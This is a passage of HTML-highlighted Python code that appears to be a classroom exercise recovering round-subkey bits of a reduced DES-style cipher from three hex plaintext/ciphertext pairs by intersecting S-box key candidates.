        <span class="p">[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]],</span>
        <span class="p">[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]],</span>
        <span class="p">[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]],</span>
        <span class="p">[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]],</span>
        <span class="p">[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]],</span>
        <span class="p">[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]],</span>
        <span class="p">[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]],</span>
        <span class="p">[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]]]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
            <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
                <span class="n">key_possible</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s_in</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">][</span><span class="n">k</span><span class="p">])</span> <span class="o">^</span> <span class="nb">int</span><span class="p">(</span><span class="n">new_extend_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">key_possible</span>

<span class="n">key_real</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
            <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]]</span>
<span class="n">key1</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">key2</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">key3</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">key4</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">key5</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">key6</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">key7</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">key8</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">def</span> <span class="nf">cryptanalysis</span><span class="p">(</span><span class="n">key_poss1</span><span class="p">,</span> <span class="n">key_poss2</span><span class="p">,</span> <span class="n">key_poss3</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> \
                    <span class="n">key_poss3</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> \
                    <span class="n">key_poss1</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> \
                    <span class="n">key_poss3</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">k</span><span class="p">]:</span>
                <span class="n">key1</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key_poss2</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">j</span><span class="p">])</span>
                <span class="c1"># if len(key1) == 1:</span>
                <span class="c1">#print("key1:", key1)</span>
            <span class="k">if</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> \
                    <span class="n">key_poss3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> \
                    <span class="n">key_poss1</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> \
                    <span class="n">key_poss3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">k</span><span class="p">]:</span>
                <span class="n">key2</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key_poss2</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">j</span><span class="p">])</span>
                <span class="c1"># if len(key2) == 1:</span>
                <span class="c1">#print("key2:", key2)</span>
            <span class="k">if</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> \
                    <span class="n">key_poss3</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> \
                    <span class="n">key_poss2</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">k</span><span class="p">]:</span>
                <span class="n">key3</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key_poss2</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">j</span><span class="p">])</span>
                <span class="c1"># if len(key3) == 1:</span>
                <span class="c1">#print("key3:", key3)</span>
            <span class="k">if</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> \
                    <span class="n">key_poss2</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> \
                    <span class="n">key_poss3</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="n">k</span><span class="p">]:</span>
                <span class="n">key4</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key_poss2</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="n">j</span><span class="p">])</span>
                <span class="c1"># if len(key4) == 1:</span>
                <span class="c1">#print("key4:", key4)</span>
            <span class="k">if</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> \
                    <span class="n">key_poss2</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> \
                    <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="n">k</span><span class="p">]:</span>
                <span class="n">key5</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key_poss2</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="n">j</span><span class="p">])</span>
                <span class="c1"># if len(key5)==1:</span>
                <span class="c1">#print("key5:", key5)</span>
            <span class="k">if</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> \
                    <span class="n">key_poss2</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> \
                    <span class="n">key_poss2</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> \
                    <span class="n">key_poss2</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="n">k</span><span class="p">]:</span>
                <span class="n">key6</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key_poss2</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="n">j</span><span class="p">])</span>
                <span class="c1"># if len(key6)==1:</span>
                <span class="c1">#print("key6:", key6)</span>
            <span class="k">if</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> \
                    <span class="n">key_poss1</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> \
                    <span class="n">key_poss1</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> \
                    <span class="n">key_poss1</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="n">k</span><span class="p">]:</span>
                <span class="n">key7</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key_poss2</span><span class="p">[</span><span class="mi">6</span><span class="p">][</span><span class="n">j</span><span class="p">])</span>
                <span class="c1"># if len(key7) == 1:</span>
                <span class="c1">#print("key7:", key7)</span>
            <span class="k">if</span> <span class="n">key_poss1</span><span class="p">[</span><span class="mi">7</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">7</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">7</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> \
                    <span class="n">key_poss1</span><span class="p">[</span><span class="mi">7</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">7</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">7</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> \
                    <span class="n">key_poss1</span><span class="p">[</span><span class="mi">7</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">7</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">7</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="ow">or</span> \
                    <span class="n">key_poss1</span><span class="p">[</span><span class="mi">7</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss2</span><span class="p">[</span><span class="mi">7</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_poss3</span><span class="p">[</span><span class="mi">7</span><span class="p">][</span><span class="n">k</span><span class="p">]:</span>
                <span class="n">key8</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key_poss2</span><span class="p">[</span><span class="mi">7</span><span class="p">][</span><span class="n">j</span><span class="p">])</span>
                <span class="c1">#print("key8:", key8)</span>
                <span class="c1">#print("key zhaodaol")</span>

    <span class="n">key_real</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">key1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">key_real</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">key2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">key_real</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">key3</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">key_real</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">key4</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">key_real</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">key5</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">key_real</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">key6</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">key_real</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">key7</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">key_real</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="n">key8</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">plaintext1</span> <span class="o">=</span> <span class="s2">"4845AB454511C0F0"</span>
    <span class="n">miwen1</span> <span class="o">=</span> <span class="s2">"2EA85F08AA80C2D2"</span>
    <span class="n">plaintext2</span> <span class="o">=</span> <span class="s2">"0123456789ABCDEF"</span>
    <span class="n">miwen2</span> <span class="o">=</span> <span class="s2">"0293A8B9E45FCE5D"</span>
    <span class="n">plaintext3</span> <span class="o">=</span> <span class="s2">"81120015A001FDF1"</span>
    <span class="n">miwen3</span> <span class="o">=</span> <span class="s2">"E88382207800FE7A"</span>

